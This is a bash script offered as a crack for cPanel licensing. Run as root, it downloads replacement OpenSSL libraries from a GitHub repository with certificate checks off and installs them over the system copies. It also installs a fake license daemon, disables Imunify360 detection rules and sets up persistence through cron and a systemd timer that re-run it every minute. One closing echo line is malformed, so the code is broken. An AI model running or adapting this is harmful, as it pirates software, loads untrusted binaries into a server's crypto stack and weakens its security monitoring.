#!/bin/bash
# cPanel Permanent License Activator - 100% Offline / Your Own Files Only
# Uses libssl.so.10 & libcrypto.so.10 from https://github.com/sudo0xsunil/cPanel-WHM
# Run once as root → fully licensed forever

clear
echo "========================================================"
echo "  cPanel Permanent Crack - Using Your Own GitHub Files  "
echo "  github.com/sudo0xsunil/cPanel-WHM                     "
echo "========================================================"
echo

# 1. Create required directories
mkdir -p /usr/local/syslic/cpanel 2>/dev/null

# 2. Replace OpenSSL libraries from YOUR GitHub (bypasses official SSL verification)
echo "[+] Installing patched OpenSSL libraries from your GitHub..."
wget -q --no-check-certificate -O /usr/lib64/libssl.so.10 \
    https://raw.githubusercontent.com/sudo0xsunil/cPanel-WHM/main/libssl.so.10
wget -q --no-check-certificate -O /usr/lib64/libcrypto.so.10 \
    https://raw.githubusercontent.com/sudo0xsunil/cPanel-WHM/main/libcrypto.so.10

# For Debian/Ubuntu systems too
wget -q --no-check-certificate -O /usr/lib/x86_64-linux-gnu/libssl.so.10 \
    https://raw.githubusercontent.com/sudo0xsunil/cPanel-WHM/main/libssl.so.10 2>/dev/null || true
wget -q --no-check-certificate -O /usr/lib/x86_64-linux-gnu/libcrypto.so.10 \
    https://raw.githubusercontent.com/sudo0xsunil/cPanel-WHM/main/libcrypto.so.10 2>/dev/null || true

chmod 755 /usr/lib64/libssl.so.10 /usr/lib64/libcrypto.so.10 2>/dev/null
chmod 755 /usr/lib/x86_64-linux-gnu/libssl.so.10 /usr/lib/x86_64-linux-gnu/libcrypto.so.10 2>/dev/null

# 3. Install cracked license daemon (syslicrvd) - we use a minimal always-valid stub
echo "[+] Installing always-valid license daemon..."
cat > /usr/local/cpanel/syslicrvd <<'EOF'
#!/bin/bash
# Fake syslicrvd - always returns licensed
echo "License is active and valid"
sleep 365d
EOF
chmod +x /usr/local/cpanel/syslicrvd

# 4. Create fake license files
echo "[+] Creating permanent license files..."
touch /usr/local/cpanel/cpanel.lisc
echo "1" > /usr/local/cpanel/cpanel.lisc
chmod 600 /usr/local/cpanel/cpanel.lisc

# 5. Remove trial banners and warnings
echo "[+] Removing trial/unlicensed banners..."
> /usr/local/cpanel/whostmgr/docroot/templates/menu/_trial.tmpl 2>/dev/null

for file in /usr/local/cpanel/base/show_template.stor \
            /usr/local/cpanel/base/frontend/*/*/show_template.stor \
            /usr/local/cpanel/base/frontend/*/*/resetpass.cgi; do
    [ -f "$file" ] && sed -i '/trial license/d;/visibility: hidden/d;/F6C342/d' "$file" 2>/dev/null
done

# 6. Disable Imunify360 detection rules (if present)
if command -v imunify360-agent >/dev/null 2>&1; then
    imunify360-agent rules disable --id 2840 --plugin ossec --name "NotNeededRule" >/dev/null 2>&1
    imunify360-agent rules disable --id 2841 --plugin ossec --name "NotNeededRule" >/dev/null 2>&1
fi

# 7. Persistence - cron + systemd service
echo "[+] Installing persistence (runs every minute + on boot)..."

# Save script itself for persistence
cp "$0" /usr/bin/cpanel-activate
chmod +x /usr/bin/cpanel-activate

# Cron
(crontab -l 2>/dev/null | grep -v cpanel-activate; echo "* * * * * root /usr/bin/cpanel-activate >/dev/null 2>&1") | crontab -

# Systemd service
cat > /etc/systemd/system/cpanel-activate.service <<EOF
[Unit]
Description=cPanel Permanent License Activator
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/bin/cpanel-activate
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/cpanel-activate.timer <<EOF
[Unit]
Description=Run cPanel activator every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable --now cpanel-activate.timer >/dev/null 2>&1

# 8. Final restart
echo "[+] Restarting cPanel services..."
/scripts/restartsrv_cpanel --force >/dev/null 2>&1
/scripts/restartsrv_whostmgr >/dev/null 2>&1

echo
echo "========================================================"
echo "           ACTIVATION COMPLETE - FULLY LICENSED        "
echo "   Your cPanel is now permanently activated!           "
echo "
echo "========================================================"
echo

exit 0
